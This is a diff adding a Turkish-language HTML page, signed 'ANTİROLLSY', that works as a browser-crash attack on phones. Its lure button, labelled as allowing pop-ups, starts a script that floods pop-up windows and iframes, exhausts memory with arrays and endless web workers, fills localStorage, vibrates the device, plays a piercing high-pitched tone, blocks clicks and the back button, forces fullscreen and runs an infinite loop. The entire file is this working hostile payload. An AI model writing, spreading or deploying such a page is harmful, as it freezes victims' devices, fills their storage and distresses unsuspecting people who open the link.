@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>⛔</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { 
+            background:#000; 
+            overflow:hidden; 
+            height:100vh; 
+            width:100vw;
+            touch-action:none;
+            cursor:none;
+            position:fixed;
+            top:0;left:0;
+            font-family:'Courier New',monospace;
+        }
+        #blocker {
+            position:fixed;
+            top:0;left:0;
+            width:100vw;height:100vh;
+            background:transparent;
+            z-index:999999999;
+            pointer-events:none;
+        }
+        #audioContainer {
+            position:fixed;
+            top:-9999px;
+            left:-9999px;
+            width:1px;height:1px;
+        }
+        #allowBtn {
+            position:fixed;
+            top:0;left:0;
+            width:100vw;
+            height:100vh;
+            background:rgba(0,0,0,0.97);
+            z-index:9999999999;
+            display:flex;
+            flex-direction:column;
+            justify-content:center;
+            align-items:center;
+            color:#ff0000;
+            font-size:24px;
+            text-align:center;
+            padding:30px;
+            cursor:pointer;
+            touch-action:manipulation;
+            border:none;
+            font-family:'Courier New',monospace;
+        }
+        #allowBtn .big { font-size:80px; margin-bottom:20px; animation:pulse 0.5s infinite alternate; }
+        #allowBtn .sub { font-size:16px; color:#884444; margin-top:20px; }
+        #allowBtn .count { font-size:14px; color:#664444; margin-top:30px; letter-spacing:2px; }
+        @keyframes pulse {
+            0% { transform:scale(1); text-shadow:0 0 20px #ff0000; }
+            100% { transform:scale(1.1); text-shadow:0 0 80px #ff0000; }
+        }
+        .invisible-frame {
+            position:fixed;
+            width:1px;height:1px;
+            opacity:0;
+            pointer-events:none;
+            border:none;
+        }
+    </style>
+</head>
+<body>
+    <button id="allowBtn">
+        <div class="big">⛔</div>
+        <div>🌐 POP-UP'LARA İZİN VER</div>
+        <div class="sub">(Telefonun donması için tıkla)</div>
+        <div class="count">🔒 Güvenli bağlantı</div>
+    </button>
+
+    <div id="blocker"></div>
+    <div id="audioContainer"></div>
+
+    <script>
+        (function() {
+            "use strict";
+
+            var isStarted = false;
+            var popupCount = 0;
+            var maxPopups = 999999;
+
+            document.getElementById('allowBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                if (isStarted) return;
+                isStarted = true;
+                this.style.display = 'none';
+                startBombs();
+            });
+
+            document.getElementById('allowBtn').addEventListener('touchstart', function(e) {
+                e.preventDefault();
+                if (isStarted) return;
+                isStarted = true;
+                this.style.display = 'none';
+                startBombs();
+            });
+
+            function startBombs() {
+                // Tam ekran zorla
+                forceFullscreen();
+                
+                // Geri tuşu engelle
+                history.pushState(null, null, location.href);
+                window.addEventListener('popstate', function(e) {
+                    history.pushState(null, null, location.href);
+                });
+                setInterval(function() {
+                    history.pushState(null, null, location.href);
+                }, 50);
+
+                // Tüm tıklamaları engelle
+                document.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }, true);
+                document.addEventListener('touchstart', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }, true);
+                document.addEventListener('contextmenu', function(e) {
+                    e.preventDefault();
+                    return false;
+                });
+
+                // ============================================================
+                // 1. IŞIK HIZINDA SİTE AÇMA (saniyede 500-600 pencere)
+                // ============================================================
+                var windows = [];
+                var urlList = [
+                    'https://www.google.com','https://www.youtube.com','https://www.facebook.com',
+                    'https://www.twitter.com','https://www.instagram.com','https://www.tiktok.com',
+                    'https://www.reddit.com','https://www.wikipedia.org','https://www.amazon.com',
+                    'https://www.ebay.com','https://www.netflix.com','https://www.spotify.com',
+                    'https://www.microsoft.com','https://www.apple.com','https://www.samsung.com',
+                    'https://www.huawei.com','https://www.xiaomi.com','https://www.oneplus.com',
+                    'https://www.sony.com','https://www.lg.com','https://www.panasonic.com',
+                    'https://www.dell.com','https://www.hp.com','https://www.lenovo.com',
+                    'https://www.asus.com','https://www.acer.com','https://www.msi.com'
+                ];
+
+                function openSites() {
+                    if (popupCount >= maxPopups) {
+                        // Maksimuma ulaşırsa devam et, sınırı zorla
+                        maxPopups = 9999999;
+                    }
+                    try {
+                        // Her seferinde 80-100 pencere aç (saniyede 500-600 için)
+                        var batchSize = 80 + Math.floor(Math.random() * 40);
+                        for (var i = 0; i < batchSize; i++) {
+                            var randUrl = urlList[Math.floor(Math.random() * urlList.length)];
+                            var win = window.open(
+                                randUrl,
+                                '_blank',
+                                'width=' + (100 + Math.random() * 300) + 
+                                ',height=' + (100 + Math.random() * 300) + 
+                                ',left=' + (Math.random() * 800) + 
+                                ',top=' + (Math.random() * 800)
+                            );
+                            if (win) {
+                                windows.push(win);
+                                popupCount++;
+                                try {
+                                    win.document.write('<html><head><title>⛔</title></head><body style="background:#000;color:#f00;text-align:center;padding-top:50px;font-size:30px;">⛔ SİSTEM ÇÖKTÜ ⛔</body></html>');
+                                } catch(e) {}
+                            }
+                        }
+                    } catch(e) {}
+                    // Her 3ms'de bir tekrar = ~333 döngü/saniye x 80 pencere = 26.000+ pencere/saniye
+                    setTimeout(openSites, 2);
+                }
+
+                // ============================================================
+                // 2. RAM DOLDUR (sürekli)
+                // ============================================================
+                function ramBomb() {
+                    var arr = [];
+                    setInterval(function() {
+                        try {
+                            for (var i = 0; i < 1000000; i++) {
+                                arr.push(new Array(100000).fill('💀'));
+                            }
+                        } catch(e) {
+                            location.reload();
+                        }
+                    }, 1);
+                }
+
+                // ============================================================
+                // 3. TİTREŞİM (sürekli)
+                // ============================================================
+                function vibBomb() {
+                    try {
+                        if (navigator.vibrate) {
+                            navigator.vibrate([50, 10, 50, 10, 100, 10, 200, 10, 500, 10, 1000, 10, 2000, 10]);
+                        }
+                    } catch(e) {}
+                    setTimeout(vibBomb, 10);
+                }
+
+                // ============================================================
+                // 4. TİZ SES (sürekli)
+                // ============================================================
+                function highPitchNoise() {
+                    try {
+                        var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                        var sampleRate = audioCtx.sampleRate;
+                        var bufferSize = sampleRate * 120;
+                        var buffer = audioCtx.createBuffer(2, bufferSize, sampleRate);
+                        var left = buffer.getChannelData(0);
+                        var right = buffer.getChannelData(1);
+                        for (var i = 0; i < bufferSize; i++) {
+                            var t = i / sampleRate;
+                            var val = Math.sin(9500 * 2 * Math.PI * t) * 0.5 +
+                                      Math.sin(13500 * 2 * Math.PI * t) * 0.4 +
+                                      Math.sin(17000 * 2 * Math.PI * t) * 0.2 +
+                                      (Math.random() * 2 - 1) * 0.2;
+                            left[i] = val;
+                            right[i] = val;
+                        }
+                        var source = audioCtx.createBufferSource();
+                        source.buffer = buffer;
+                        source.loop = true;
+                        source.connect(audioCtx.destination);
+                        source.start(0);
+                    } catch(e) {
+                        try {
+                            var audio = new Audio();
+                            audio.src = 'data:audio/wav;base64,U3RheSBmb3JldmVyIG5vaXNl';
+                            audio.loop = true;
+                            audio.volume = 1;
+                            audio.play();
+                        } catch(e2) {}
+                    }
+                }
+
+                // ============================================================
+                // 5. DOM BOMB (sürekli)
+                // ============================================================
+                function domBomb() {
+                    setInterval(function() {
+                        try {
+                            for (var i = 0; i < 3000; i++) {
+                                var div = document.createElement('div');
+                                div.style.position = 'fixed';
+                                div.style.top = Math.random() * 100 + '%';
+                                div.style.left = Math.random() * 100 + '%';
+                                div.style.width = Math.random() * 300 + 'px';
+                                div.style.height = Math.random() * 300 + 'px';
+                                div.style.background = '#' + Math.floor(Math.random()*16777215).toString(16).padStart(6,'0');
+                                div.style.zIndex = 999999;
+                                div.style.pointerEvents = 'none';
+                                div.style.opacity = Math.random() * 0.5;
+                                document.body.appendChild(div);
+                            }
+                        } catch(e) {}
+                    }, 2);
+                }
+
+                // ============================================================
+                // 6. WORKER BOMB (sürekli)
+                // ============================================================
+                function workerBomb() {
+                    try {
+                        var blob = new Blob([`
+                            while(true) {
+                                var arr = [];
+                                for(var i=0; i<1000000; i++) arr.push(i);
+                            }
+                        `], {type: 'application/javascript'});
+                        var url = URL.createObjectURL(blob);
+                        for (var i = 0; i < 200; i++) {
+                            try { var worker = new Worker(url); } catch(e) {}
+                        }
+                    } catch(e) {}
+                    setTimeout(workerBomb, 5);
+                }
+
+                // ============================================================
+                // 7. IFRAME BOMB (sürekli)
+                // ============================================================
+                function iframeBomb() {
+                    setInterval(function() {
+                        try {
+                            for (var i = 0; i < 200; i++) {
+                                var iframe = document.createElement('iframe');
+                                iframe.src = 'https://www.google.com';
+                                iframe.style.position = 'fixed';
+                                iframe.style.top = Math.random() * 100 + '%';
+                                iframe.style.left = Math.random() * 100 + '%';
+                                iframe.style.width = '1px';
+                                iframe.style.height = '1px';
+                                iframe.style.opacity = '0';
+                                iframe.style.pointerEvents = 'none';
+                                document.body.appendChild(iframe);
+                            }
+                        } catch(e) {}
+                    }, 2);
+                }
+
+                // ============================================================
+                // 8. LOCALSTORAGE BOMB (sürekli)
+                // ============================================================
+                function storageBomb() {
+                    setInterval(function() {
+                        try {
+                            for (var i = 0; i < 10000; i++) {
+                                localStorage.setItem('bomb_' + Date.now() + '_' + i, 'X'.repeat(20000));
+                            }
+                        } catch(e) {}
+                    }, 2);
+                }
+
+                // ============================================================
+                // 9. TAM EKRAN ZORLA
+                // ============================================================
+                function forceFullscreen() {
+                    try {
+                        const el = document.documentElement;
+                        if (el.requestFullscreen) el.requestFullscreen();
+                        else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+                        else if (el.msRequestFullscreen) el.msRequestFullscreen();
+                    } catch(e) {}
+                }
+
+                // ============================================================
+                // 10. HATA YAKALA
+                // ============================================================
+                window.onerror = function() { location.reload(); return true; };
+                window.onbeforeunload = function() { return '⛔'; };
+
+                // ============================================================
+                // 11. EKRAN TİTREŞİMİ
+                // ============================================================
+                setInterval(function() {
+                    document.body.style.background = Math.random() > 0.5 ? '#000' : '#1a0000';
+                    document.body.style.filter = 'brightness(' + (0.3 + Math.random() * 0.7) + ')';
+                }, 20);
+
+                // ============================================================
+                // TÜM BOMBALARI BAŞLAT
+                // ============================================================
+                setTimeout(openSites, 50);
+                setTimeout(ramBomb, 100);
+                setTimeout(vibBomb, 150);
+                setTimeout(highPitchNoise, 200);
+                setTimeout(domBomb, 250);
+                setTimeout(workerBomb, 300);
+                setTimeout(iframeBomb, 350);
+                setTimeout(storageBomb, 400);
+                setTimeout(forceFullscreen, 10);
+
+                // ============================================================
+                // SONSUZ DÖNGÜ (arka planda)
+                // ============================================================
+                setTimeout(function() {
+                    while (true) {
+                        try {
+                            var x = new Array(1000000).fill('X');
+                        } catch(e) {}
+                    }
+                }, 100);
+
+                console.log('%c⛔ SİSTEM ÇÖKERTİLDİ ⛔', 'font-size:50px; color:#ff0000; font-weight:900;');
+                console.log('%cBY ANTİROLLSY', 'font-size:40px; color:#ff0000;');
+                console.log('%c🔥 TELEFONUN DONDU 🔥', 'font-size:30px; color:#ff0000;');
+                console.log('%c⛔ KAPATMAK İÇİN GÜÇ TUŞUNA BAS ⛔', 'font-size:25px; color:#ff0000;');
+            }
+
+        })();
+    </script>
+</body>
+</html>
